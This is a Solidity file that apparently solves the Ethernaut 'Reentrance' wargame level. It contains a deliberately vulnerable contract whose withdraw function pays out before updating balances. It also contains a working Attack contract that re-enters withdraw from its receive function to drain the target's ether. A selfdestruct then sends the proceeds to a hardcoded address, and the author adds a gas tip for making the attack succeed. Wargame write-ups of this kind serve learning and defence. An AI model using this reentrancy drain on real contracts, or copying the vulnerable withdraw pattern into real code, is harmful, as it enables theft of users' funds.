// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import 'openzeppelin-contracts-06/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}


// SOLUTION
// The mistake i made was withdrawing to small wei and this keep failing due to gas, to be on a safe side, you can donate 0.0005ETH


interface IReentrance{
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

contract Attack{
    IReentrance public reentrance;

    constructor(address _addr) payable{
        reentrance = IReentrance(_addr);
    }

    function attack() public payable {
        reentrance.donate{value:msg.value}(address(this));
        reentrance.withdraw(msg.value);
    }

    function die() public payable{
        selfdestruct(payable(0x84cA9f6E928778230e7388F7e82C6bBf1461556d));
    } 
    receive() external payable{
        uint balance = address(reentrance).balance;
        if(balance > 0 ether){
            reentrance.withdraw(0.0005 ether);
        }
    }
}